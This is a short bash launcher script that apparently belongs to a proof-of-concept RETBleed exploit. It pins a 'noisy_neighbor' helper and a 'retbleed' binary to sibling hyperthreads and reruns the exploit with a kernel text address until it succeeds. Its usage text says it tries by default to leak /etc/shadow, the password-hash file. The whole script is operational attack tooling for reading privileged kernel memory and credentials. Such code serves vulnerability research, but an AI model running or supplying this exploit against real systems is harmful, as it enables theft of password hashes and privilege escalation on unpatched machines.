#!/bin/bash
set -e
if [ $# -lt 1 ]; then
  echo "usage: $0 <kernel_text> [core_id=0] [leak_perf]"
  echo "  unless leak_perf is set (to anything), try to leak /etc/shadow"
  exit 1
fi

function kill_neighbor {
  kill -SIGTERM $!
}

trap kill_neighbor EXIT

CORE=${2:-0}
cpulist=($(grep core\ id /proc/cpuinfo | nl -v 0 | grep "$CORE$" | sed 's/\s*\([0-9]*\).*$/\1/g'))
HT1=${cpulist[0]}
HT2=${cpulist[1]}

KERN_TEXT=$1

echo Using Core $HT1 and $HT2

taskset -c $HT1 ./noisy_neighbor &
sleep 0.1 # just dont mess up the output from neighbor
while ! taskset -c $HT2 ./retbleed $KERN_TEXT $3; do
  true
done
